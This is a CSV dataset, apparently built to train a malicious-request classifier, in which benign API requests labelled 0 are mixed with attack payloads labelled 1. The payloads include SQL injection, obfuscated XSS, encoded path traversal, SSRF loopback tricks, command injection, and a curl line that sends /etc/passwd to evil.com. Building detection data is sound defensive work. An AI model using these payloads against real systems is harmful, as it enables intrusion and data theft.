"text","label"
"DELETE /api/sessions/current Authorization: Bearer abc123","0"
"GET /api/analytics?from=2024-01-01&to=2024-12-31","0"
"....\\....\\....\\windows\\system32\\cmd.exe","1"
"url=http://0177.0.0.1/","1"
"GET /api/reports?type=monthly&year=2024","0"
"%252e%252e%252fetc%252fpasswd","1"
"<math><mi//xlink:href='data:x,<script>alert(1)</script>'>","1"
"<script>eval(atob('YWxlcnQoMSk='))</script>","1"
"%252e%252e%252fetc%252fpasswd","1"
"GET /api/reports?type=monthly&year=2024","0"
"POST /api/payments body={amount:100,currency:EGP}","0"
"GET /api/analytics?from=2024-01-01&to=2024-12-31","0"
"GET /api/notifications?unread=true&limit=10","0"
"GET /api/analytics?from=2024-01-01&to=2024-12-31","0"
"file=$(cat /etc/passwd); curl http://evil.com/?d=$file","1"
"PUT /api/users/profile Accept-Language: ar-EG,ar;q=0.9","0"
"%252e%252e%252fetc%252fpasswd","1"
"1; EXEC master..xp_cmdshell('dir c:\\')","1"
"' AND 1=2 UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()--","1"
"' AND 1=2 UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()--","1"
"POST /api/payments body={amount:100,currency:EGP}","0"
"PUT /api/users/profile Accept-Language: ar-EG,ar;q=0.9","0"
"<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>","1"
"' GROUP BY columnnames having 1=1--","1"
"DELETE /api/sessions/current Authorization: Bearer abc123","0"
"' HAVING 1=1--","1"
"' HAVING 1=1--","1"
"url=http://2130706433/","1"
"url=http://0177.0.0.1/","1"
"file=$(cat /etc/passwd); curl http://evil.com/?d=$file","1"
"%252e%252e%252fetc%252fpasswd","1"
"DELETE /api/sessions/current Authorization: Bearer abc123","0"
"file=$(cat /etc/passwd); curl http://evil.com/?d=$file","1"
"GET /api/analytics?from=2024-01-01&to=2024-12-31","0"
"GET /api/analytics?from=2024-01-01&to=2024-12-31","0"
"....\\....\\....\\windows\\system32\\cmd.exe","1"
"1; EXEC master..xp_cmdshell('dir c:\\')","1"
"url=http://0177.0.0.1/","1"
"<script>eval(atob('YWxlcnQoMSk='))</script>","1"
"<script>eval(atob('YWxlcnQoMSk='))</script>","1"
"url=http://[::1]/admin","1"
"GET /api/notifications?unread=true&limit=10","0"
"url=http://[::1]/admin","1"
"%252e%252e%252fetc%252fpasswd","1"
"url=http://2130706433/","1"
"<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>","1"
";{cat,/etc/passwd}","1"
"<math><mi//xlink:href='data:x,<script>alert(1)</script>'>","1"
"POST /graphql Content-Type: application/json query={user{id,name}}","0"
"GET /api/analytics?from=2024-01-01&to=2024-12-31","0"
"' HAVING 1=1--","1"
"<math><mi//xlink:href='data:x,<script>alert(1)</script>'>","1"
"url=http://[::1]/admin","1"
"POST /graphql Content-Type: application/json query={user{id,name}}","0"
"file=$(cat /etc/passwd); curl http://evil.com/?d=$file","1"
"1; EXEC master..xp_cmdshell('dir c:\\')","1"
"PUT /api/users/profile Accept-Language: ar-EG,ar;q=0.9","0"
"GET /api/reports?type=monthly&year=2024","0"
"POST /api/payments body={amount:100,currency:EGP}","0"
"GET /api/reports?type=monthly&year=2024","0"
"' GROUP BY columnnames having 1=1--","1"
"PATCH /api/orders/ORD-456 body={status:shipped}","0"
"PUT /api/users/profile Accept-Language: ar-EG,ar;q=0.9","0"
"PUT /api/users/profile Accept-Language: ar-EG,ar;q=0.9","0"
"....\\....\\....\\windows\\system32\\cmd.exe","1"
"....\\....\\....\\windows\\system32\\cmd.exe","1"
"GET /api/analytics?from=2024-01-01&to=2024-12-31","0"
"GET /api/v2/products?filter=price_lt:1000&sort=rating:desc HTTP/1.1","0"
"PUT /api/users/profile Accept-Language: ar-EG,ar;q=0.9","0"
"DELETE /api/sessions/current Authorization: Bearer abc123","0"
"POST /graphql Content-Type: application/json query={user{id,name}}","0"
"GET /api/reports?type=monthly&year=2024","0"
"GET /api/reports?type=monthly&year=2024","0"
"GET /api/analytics?from=2024-01-01&to=2024-12-31","0"
"POST /api/auth/refresh token=eyJ...","0"
"POST /api/auth/refresh token=eyJ...","0"
"PUT /api/users/profile Accept-Language: ar-EG,ar;q=0.9","0"
"GET /api/analytics?from=2024-01-01&to=2024-12-31","0"
"GET /api/reports?type=monthly&year=2024","0"
"POST /api/payments body={amount:100,currency:EGP}","0"
"' GROUP BY columnnames having 1=1--","1"
"<math><mi//xlink:href='data:x,<script>alert(1)</script>'>","1"
"1; EXEC master..xp_cmdshell('dir c:\\')","1"
"<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>","1"
"GET /api/reports?type=monthly&year=2024","0"
"GET /api/reports?type=monthly&year=2024","0"
"GET /api/analytics?from=2024-01-01&to=2024-12-31","0"
"POST /api/auth/refresh token=eyJ...","0"
"<script>eval(atob('YWxlcnQoMSk='))</script>","1"
"GET /api/analytics?from=2024-01-01&to=2024-12-31","0"
"PATCH /api/orders/ORD-456 body={status:shipped}","0"
"url=http://2130706433/","1"
"POST /api/auth/refresh token=eyJ...","0"
"url=http://2130706433/","1"
"GET /api/notifications?unread=true&limit=10","0"
"' AND 1=2 UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()--","1"
"' AND 1=2 UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()--","1"
"POST /api/payments body={amount:100,currency:EGP}","0"
"POST /graphql Content-Type: application/json query={user{id,name}}","0"
";{cat,/etc/passwd}","1"
"GET /api/notifications?unread=true&limit=10","0"
"url=http://[::1]/admin","1"
"GET /api/analytics?from=2024-01-01&to=2024-12-31","0"
"GET /api/v2/products?filter=price_lt:1000&sort=rating:desc HTTP/1.1","0"
"DELETE /api/sessions/current Authorization: Bearer abc123","0"
"PATCH /api/orders/ORD-456 body={status:shipped}","0"
"POST /graphql Content-Type: application/json query={user{id,name}}","0"
"DELETE /api/sessions/current Authorization: Bearer abc123","0"
"file=$(cat /etc/passwd); curl http://evil.com/?d=$file","1"
"....\\....\\....\\windows\\system32\\cmd.exe","1"
"POST /graphql Content-Type: application/json query={user{id,name}}","0"
"DELETE /api/sessions/current Authorization: Bearer abc123","0"
"%252e%252e%252fetc%252fpasswd","1"
"GET /api/analytics?from=2024-01-01&to=2024-12-31","0"
"POST /api/payments body={amount:100,currency:EGP}","0"
"<script>eval(atob('YWxlcnQoMSk='))</script>","1"
"GET /api/notifications?unread=true&limit=10","0"
"<math><mi//xlink:href='data:x,<script>alert(1)</script>'>","1"
"GET /api/analytics?from=2024-01-01&to=2024-12-31","0"
"....\\....\\....\\windows\\system32\\cmd.exe","1"
"GET /api/notifications?unread=true&limit=10","0"
"<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>","1"
";{cat,/etc/passwd}","1"
"GET /api/v2/products?filter=price_lt:1000&sort=rating:desc HTTP/1.1","0"
"POST /api/payments body={amount:100,currency:EGP}","0"
"PUT /api/users/profile Accept-Language: ar-EG,ar;q=0.9","0"
"....\\....\\....\\windows\\system32\\cmd.exe","1"
"GET /api/analytics?from=2024-01-01&to=2024-12-31","0"
"file=$(cat /etc/passwd); curl http://evil.com/?d=$file","1"
"' HAVING 1=1--","1"
"' AND 1=2 UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()--","1"
"' AND 1=2 UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()--","1"
"GET /api/v2/products?filter=price_lt:1000&sort=rating:desc HTTP/1.1","0"
"url=http://2130706433/","1"
"1; EXEC master..xp_cmdshell('dir c:\\')","1"
"' GROUP BY columnnames having 1=1--","1"
"POST /api/payments body={amount:100,currency:EGP}","0"
"GET /api/v2/products?filter=price_lt:1000&sort=rating:desc HTTP/1.1","0"
"GET /api/reports?type=monthly&year=2024","0"
"<math><mi//xlink:href='data:x,<script>alert(1)</script>'>","1"
"<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>","1"
"PUT /api/users/profile Accept-Language: ar-EG,ar;q=0.9","0"
"PATCH /api/orders/ORD-456 body={status:shipped}","0"
"POST /api/auth/refresh token=eyJ...","0"
"GET /api/analytics?from=2024-01-01&to=2024-12-31","0"
"%252e%252e%252fetc%252fpasswd","1"
"url=http://0177.0.0.1/","1"
"1; EXEC master..xp_cmdshell('dir c:\\')","1"
"POST /graphql Content-Type: application/json query={user{id,name}}","0"
"GET /api/analytics?from=2024-01-01&to=2024-12-31","0"
"url=http://0177.0.0.1/","1"
"' AND 1=2 UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()--","1"
"POST /api/payments body={amount:100,currency:EGP}","0"
"url=http://[::1]/admin","1"
"....\\....\\....\\windows\\system32\\cmd.exe","1"
"<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>","1"
"file=$(cat /etc/passwd); curl http://evil.com/?d=$file","1"
"POST /api/payments body={amount:100,currency:EGP}","0"
"PATCH /api/orders/ORD-456 body={status:shipped}","0"
"%252e%252e%252fetc%252fpasswd","1"
"<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>","1"
"url=http://0177.0.0.1/","1"
"<math><mi//xlink:href='data:x,<script>alert(1)</script>'>","1"
"url=http://[::1]/admin","1"
"PUT /api/users/profile Accept-Language: ar-EG,ar;q=0.9","0"
"%252e%252e%252fetc%252fpasswd","1"
"<math><mi//xlink:href='data:x,<script>alert(1)</script>'>","1"
"GET /api/v2/products?filter=price_lt:1000&sort=rating:desc HTTP/1.1","0"
"GET /api/notifications?unread=true&limit=10","0"
"' HAVING 1=1--","1"
"<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>","1"
"url=http://2130706433/","1"
"file=$(cat /etc/passwd); curl http://evil.com/?d=$file","1"
"GET /api/v2/products?filter=price_lt:1000&sort=rating:desc HTTP/1.1","0"
"POST /api/auth/refresh token=eyJ...","0"
"%252e%252e%252fetc%252fpasswd","1"
"' HAVING 1=1--","1"
"POST /api/payments body={amount:100,currency:EGP}","0"
"url=http://[::1]/admin","1"
"....\\....\\....\\windows\\system32\\cmd.exe","1"
"<math><mi//xlink:href='data:x,<script>alert(1)</script>'>","1"
"DELETE /api/sessions/current Authorization: Bearer abc123","0"
"PUT /api/users/profile Accept-Language: ar-EG,ar;q=0.9","0"
"GET /api/notifications?unread=true&limit=10","0"
"%252e%252e%252fetc%252fpasswd","1"
"<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>","1"
"' GROUP BY columnnames having 1=1--","1"
"file=$(cat /etc/passwd); curl http://evil.com/?d=$file","1"
"....\\....\\....\\windows\\system32\\cmd.exe","1"
"DELETE /api/sessions/current Authorization: Bearer abc123","0"
"PATCH /api/orders/ORD-456 body={status:shipped}","0"
"' GROUP BY columnnames having 1=1--","1"
"GET /api/v2/products?filter=price_lt:1000&sort=rating:desc HTTP/1.1","0"
"DELETE /api/sessions/current Authorization: Bearer abc123","0"
"' AND 1=2 UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()--","1"
"POST /api/payments body={amount:100,currency:EGP}","0"
"POST /api/payments body={amount:100,currency:EGP}","0"
"%252e%252e%252fetc%252fpasswd","1"
"GET /api/v2/products?filter=price_lt:1000&sort=rating:desc HTTP/1.1","0"
"GET /api/analytics?from=2024-01-01&to=2024-12-31","0"
"' GROUP BY columnnames having 1=1--","1"
"' HAVING 1=1--","1"
"<script>eval(atob('YWxlcnQoMSk='))</script>","1"
"url=http://[::1]/admin","1"
"PUT /api/users/profile Accept-Language: ar-EG,ar;q=0.9","0"
"<script>eval(atob('YWxlcnQoMSk='))</script>","1"
"POST /graphql Content-Type: application/json query={user{id,name}}","0"
"file=$(cat /etc/passwd); curl http://evil.com/?d=$file","1"
";{cat,/etc/passwd}","1"
"POST /api/auth/refresh token=eyJ...","0"
"POST /api/auth/refresh token=eyJ...","0"
"%252e%252e%252fetc%252fpasswd","1"
"PUT /api/users/profile Accept-Language: ar-EG,ar;q=0.9","0"
"GET /api/reports?type=monthly&year=2024","0"
"POST /api/auth/refresh token=eyJ...","0"
"PATCH /api/orders/ORD-456 body={status:shipped}","0"
";{cat,/etc/passwd}","1"
"' AND 1=2 UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()--","1"
"POST /api/auth/refresh token=eyJ...","0"
"GET /api/notifications?unread=true&limit=10","0"
"<script>eval(atob('YWxlcnQoMSk='))</script>","1"
"PATCH /api/orders/ORD-456 body={status:shipped}","0"
"<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>","1"
"POST /graphql Content-Type: application/json query={user{id,name}}","0"
"POST /api/payments body={amount:100,currency:EGP}","0"
"GET /api/notifications?unread=true&limit=10","0"
"<math><mi//xlink:href='data:x,<script>alert(1)</script>'>","1"
"url=http://0177.0.0.1/","1"
"GET /api/v2/products?filter=price_lt:1000&sort=rating:desc HTTP/1.1","0"
"PATCH /api/orders/ORD-456 body={status:shipped}","0"
";{cat,/etc/passwd}","1"
"' HAVING 1=1--","1"
"' AND 1=2 UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()--","1"
"PUT /api/users/profile Accept-Language: ar-EG,ar;q=0.9","0"
"PATCH /api/orders/ORD-456 body={status:shipped}","0"
"GET /api/analytics?from=2024-01-01&to=2024-12-31","0"
"POST /api/payments body={amount:100,currency:EGP}","0"
"GET /api/analytics?from=2024-01-01&to=2024-12-31","0"
"POST /api/auth/refresh token=eyJ...","0"
"%252e%252e%252fetc%252fpasswd","1"
"POST /graphql Content-Type: application/json query={user{id,name}}","0"
"GET /api/notifications?unread=true&limit=10","0"
"GET /api/reports?type=monthly&year=2024","0"
"PATCH /api/orders/ORD-456 body={status:shipped}","0"
"PUT /api/users/profile Accept-Language: ar-EG,ar;q=0.9","0"
"DELETE /api/sessions/current Authorization: Bearer abc123","0"
"GET /api/v2/products?filter=price_lt:1000&sort=rating:desc HTTP/1.1","0"
"GET /api/notifications?unread=true&limit=10","0"
";{cat,/etc/passwd}","1"
"PUT /api/users/profile Accept-Language: ar-EG,ar;q=0.9","0"
";{cat,/etc/passwd}","1"
"' GROUP BY columnnames having 1=1--","1"
"GET /api/reports?type=monthly&year=2024","0"
"%252e%252e%252fetc%252fpasswd","1"
"' GROUP BY columnnames having 1=1--","1"
"GET /api/v2/products?filter=price_lt:1000&sort=rating:desc HTTP/1.1","0"
"PATCH /api/orders/ORD-456 body={status:shipped}","0"
"....\\....\\....\\windows\\system32\\cmd.exe","1"
"DELETE /api/sessions/current Authorization: Bearer abc123","0"
"1; EXEC master..xp_cmdshell('dir c:\\')","1"
"GET /api/reports?type=monthly&year=2024","0"
"1; EXEC master..xp_cmdshell('dir c:\\')","1"
"GET /api/notifications?unread=true&limit=10","0"
"PATCH /api/orders/ORD-456 body={status:shipped}","0"
"POST /graphql Content-Type: application/json query={user{id,name}}","0"
"DELETE /api/sessions/current Authorization: Bearer abc123","0"
"PATCH /api/orders/ORD-456 body={status:shipped}","0"
"PUT /api/users/profile Accept-Language: ar-EG,ar;q=0.9","0"
"' HAVING 1=1--","1"
"GET /api/reports?type=monthly&year=2024","0"
"GET /api/v2/products?filter=price_lt:1000&sort=rating:desc HTTP/1.1","0"
"POST /api/auth/refresh token=eyJ...","0"
"POST /api/auth/refresh token=eyJ...","0"
"GET /api/v2/products?filter=price_lt:1000&sort=rating:desc HTTP/1.1","0"
"GET /api/analytics?from=2024-01-01&to=2024-12-31","0"
"DELETE /api/sessions/current Authorization: Bearer abc123","0"
"DELETE /api/sessions/current Authorization: Bearer abc123","0"
"' AND 1=2 UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()--","1"
"<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>","1"
"GET /api/reports?type=monthly&year=2024","0"
"file=$(cat /etc/passwd); curl http://evil.com/?d=$file","1"
"<math><mi//xlink:href='data:x,<script>alert(1)</script>'>","1"
"' GROUP BY columnnames having 1=1--","1"
"<script>eval(atob('YWxlcnQoMSk='))</script>","1"
"file=$(cat /etc/passwd); curl http://evil.com/?d=$file","1"
"POST /graphql Content-Type: application/json query={user{id,name}}","0"
"1; EXEC master..xp_cmdshell('dir c:\\')","1"
"1; EXEC master..xp_cmdshell('dir c:\\')","1"
";{cat,/etc/passwd}","1"
"url=http://2130706433/","1"
"POST /api/payments body={amount:100,currency:EGP}","0"
"<script>eval(atob('YWxlcnQoMSk='))</script>","1"
"' AND 1=2 UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()--","1"
"<math><mi//xlink:href='data:x,<script>alert(1)</script>'>","1"
";{cat,/etc/passwd}","1"
"' GROUP BY columnnames having 1=1--","1"
"POST /api/payments body={amount:100,currency:EGP}","0"
"GET /api/notifications?unread=true&limit=10","0"
"DELETE /api/sessions/current Authorization: Bearer abc123","0"
"' GROUP BY columnnames having 1=1--","1"
"%252e%252e%252fetc%252fpasswd","1"
"<script>eval(atob('YWxlcnQoMSk='))</script>","1"
"<script>eval(atob('YWxlcnQoMSk='))</script>","1"
"GET /api/reports?type=monthly&year=2024","0"
"1; EXEC master..xp_cmdshell('dir c:\\')","1"
"PUT /api/users/profile Accept-Language: ar-EG,ar;q=0.9","0"
"POST /api/auth/refresh token=eyJ...","0"
"file=$(cat /etc/passwd); curl http://evil.com/?d=$file","1"
"POST /api/auth/refresh token=eyJ...","0"
"GET /api/v2/products?filter=price_lt:1000&sort=rating:desc HTTP/1.1","0"
"%252e%252e%252fetc%252fpasswd","1"
"PATCH /api/orders/ORD-456 body={status:shipped}","0"
"GET /api/analytics?from=2024-01-01&to=2024-12-31","0"
"....\\....\\....\\windows\\system32\\cmd.exe","1"
"POST /api/payments body={amount:100,currency:EGP}","0"
"<math><mi//xlink:href='data:x,<script>alert(1)</script>'>","1"
"GET /api/analytics?from=2024-01-01&to=2024-12-31","0"
"GET /api/analytics?from=2024-01-01&to=2024-12-31","0"
"PUT /api/users/profile Accept-Language: ar-EG,ar;q=0.9","0"
"GET /api/reports?type=monthly&year=2024","0"
"PATCH /api/orders/ORD-456 body={status:shipped}","0"
"GET /api/notifications?unread=true&limit=10","0"
"GET /api/notifications?unread=true&limit=10","0"
"POST /api/payments body={amount:100,currency:EGP}","0"
"<math><mi//xlink:href='data:x,<script>alert(1)</script>'>","1"
"<script>eval(atob('YWxlcnQoMSk='))</script>","1"
"POST /api/payments body={amount:100,currency:EGP}","0"
"GET /api/analytics?from=2024-01-01&to=2024-12-31","0"
"url=http://[::1]/admin","1"
"GET /api/analytics?from=2024-01-01&to=2024-12-31","0"
"GET /api/notifications?unread=true&limit=10","0"
"GET /api/v2/products?filter=price_lt:1000&sort=rating:desc HTTP/1.1","0"
"1; EXEC master..xp_cmdshell('dir c:\\')","1"
"url=http://0177.0.0.1/","1"
"GET /api/reports?type=monthly&year=2024","0"
"GET /api/notifications?unread=true&limit=10","0"
"PATCH /api/orders/ORD-456 body={status:shipped}","0"
"....\\....\\....\\windows\\system32\\cmd.exe","1"
"PATCH /api/orders/ORD-456 body={status:shipped}","0"
"POST /api/payments body={amount:100,currency:EGP}","0"
"....\\....\\....\\windows\\system32\\cmd.exe","1"
"PATCH /api/orders/ORD-456 body={status:shipped}","0"
"%252e%252e%252fetc%252fpasswd","1"
"GET /api/reports?type=monthly&year=2024","0"
"POST /graphql Content-Type: application/json query={user{id,name}}","0"
"' HAVING 1=1--","1"
"POST /graphql Content-Type: application/json query={user{id,name}}","0"
"....\\....\\....\\windows\\system32\\cmd.exe","1"
"DELETE /api/sessions/current Authorization: Bearer abc123","0"
"PUT /api/users/profile Accept-Language: ar-EG,ar;q=0.9","0"
"GET /api/v2/products?filter=price_lt:1000&sort=rating:desc HTTP/1.1","0"
"POST /api/payments body={amount:100,currency:EGP}","0"
"GET /api/analytics?from=2024-01-01&to=2024-12-31","0"
"url=http://[::1]/admin","1"
"<script>eval(atob('YWxlcnQoMSk='))</script>","1"
"url=http://0177.0.0.1/","1"
"GET /api/notifications?unread=true&limit=10","0"
"GET /api/analytics?from=2024-01-01&to=2024-12-31","0"
"GET /api/analytics?from=2024-01-01&to=2024-12-31","0"
"' HAVING 1=1--","1"
"POST /api/payments body={amount:100,currency:EGP}","0"
"' AND 1=2 UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()--","1"
"file=$(cat /etc/passwd); curl http://evil.com/?d=$file","1"
"' HAVING 1=1--","1"
"url=http://0177.0.0.1/","1"
"GET /api/analytics?from=2024-01-01&to=2024-12-31","0"
"GET /api/reports?type=monthly&year=2024","0"
"GET /api/v2/products?filter=price_lt:1000&sort=rating:desc HTTP/1.1","0"
"PATCH /api/orders/ORD-456 body={status:shipped}","0"
"file=$(cat /etc/passwd); curl http://evil.com/?d=$file","1"
"....\\....\\....\\windows\\system32\\cmd.exe","1"
";{cat,/etc/passwd}","1"
"GET /api/reports?type=monthly&year=2024","0"
"PUT /api/users/profile Accept-Language: ar-EG,ar;q=0.9","0"
"<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>","1"
"....\\....\\....\\windows\\system32\\cmd.exe","1"
"PATCH /api/orders/ORD-456 body={status:shipped}","0"
"GET /api/v2/products?filter=price_lt:1000&sort=rating:desc HTTP/1.1","0"
"....\\....\\....\\windows\\system32\\cmd.exe","1"
"GET /api/analytics?from=2024-01-01&to=2024-12-31","0"
"PUT /api/users/profile Accept-Language: ar-EG,ar;q=0.9","0"
"url=http://[::1]/admin","1"
"GET /api/v2/products?filter=price_lt:1000&sort=rating:desc HTTP/1.1","0"
"DELETE /api/sessions/current Authorization: Bearer abc123","0"
"GET /api/reports?type=monthly&year=2024","0"
"' HAVING 1=1--","1"
"' HAVING 1=1--","1"
"' HAVING 1=1--","1"
"GET /api/notifications?unread=true&limit=10","0"
"PATCH /api/orders/ORD-456 body={status:shipped}","0"
"POST /api/auth/refresh token=eyJ...","0"
"GET /api/notifications?unread=true&limit=10","0"
"GET /api/reports?type=monthly&year=2024","0"
"%252e%252e%252fetc%252fpasswd","1"
"PUT /api/users/profile Accept-Language: ar-EG,ar;q=0.9","0"
"<math><mi//xlink:href='data:x,<script>alert(1)</script>'>","1"
"DELETE /api/sessions/current Authorization: Bearer abc123","0"
"GET /api/v2/products?filter=price_lt:1000&sort=rating:desc HTTP/1.1","0"
"POST /api/payments body={amount:100,currency:EGP}","0"
"1; EXEC master..xp_cmdshell('dir c:\\')","1"
"GET /api/v2/products?filter=price_lt:1000&sort=rating:desc HTTP/1.1","0"
"POST /graphql Content-Type: application/json query={user{id,name}}","0"
"GET /api/analytics?from=2024-01-01&to=2024-12-31","0"
"' GROUP BY columnnames having 1=1--","1"
"GET /api/analytics?from=2024-01-01&to=2024-12-31","0"
";{cat,/etc/passwd}","1"
"url=http://0177.0.0.1/","1"
"file=$(cat /etc/passwd); curl http://evil.com/?d=$file","1"
"file=$(cat /etc/passwd); curl http://evil.com/?d=$file","1"
"DELETE /api/sessions/current Authorization: Bearer abc123","0"
"POST /api/auth/refresh token=eyJ...","0"
"GET /api/reports?type=monthly&year=2024","0"
"POST /api/payments body={amount:100,currency:EGP}","0"
"<script>eval(atob('YWxlcnQoMSk='))</script>","1"
"' AND 1=2 UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()--","1"
"DELETE /api/sessions/current Authorization: Bearer abc123","0"
"POST /graphql Content-Type: application/json query={user{id,name}}","0"
"POST /api/auth/refresh token=eyJ...","0"
"POST /api/payments body={amount:100,currency:EGP}","0"
"' GROUP BY columnnames having 1=1--","1"
"POST /api/auth/refresh token=eyJ...","0"
"DELETE /api/sessions/current Authorization: Bearer abc123","0"
";{cat,/etc/passwd}","1"
"DELETE /api/sessions/current Authorization: Bearer abc123","0"
"GET /api/reports?type=monthly&year=2024","0"
"<script>eval(atob('YWxlcnQoMSk='))</script>","1"
"' GROUP BY columnnames having 1=1--","1"
"' GROUP BY columnnames having 1=1--","1"
"<script>eval(atob('YWxlcnQoMSk='))</script>","1"
"<script>eval(atob('YWxlcnQoMSk='))</script>","1"
"1; EXEC master..xp_cmdshell('dir c:\\')","1"
"....\\....\\....\\windows\\system32\\cmd.exe","1"
"GET /api/v2/products?filter=price_lt:1000&sort=rating:desc HTTP/1.1","0"
"url=http://0177.0.0.1/","1"
"DELETE /api/sessions/current Authorization: Bearer abc123","0"
"<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>","1"
"GET /api/v2/products?filter=price_lt:1000&sort=rating:desc HTTP/1.1","0"
"<script>eval(atob('YWxlcnQoMSk='))</script>","1"
"DELETE /api/sessions/current Authorization: Bearer abc123","0"
"GET /api/reports?type=monthly&year=2024","0"
"' GROUP BY columnnames having 1=1--","1"
"<script>eval(atob('YWxlcnQoMSk='))</script>","1"
"GET /api/reports?type=monthly&year=2024","0"
"url=http://[::1]/admin","1"
"%252e%252e%252fetc%252fpasswd","1"
"DELETE /api/sessions/current Authorization: Bearer abc123","0"
"url=http://2130706433/","1"
"url=http://2130706433/","1"
"POST /api/auth/refresh token=eyJ...","0"
"url=http://2130706433/","1"
"PUT /api/users/profile Accept-Language: ar-EG,ar;q=0.9","0"
"' HAVING 1=1--","1"
"1; EXEC master..xp_cmdshell('dir c:\\')","1"
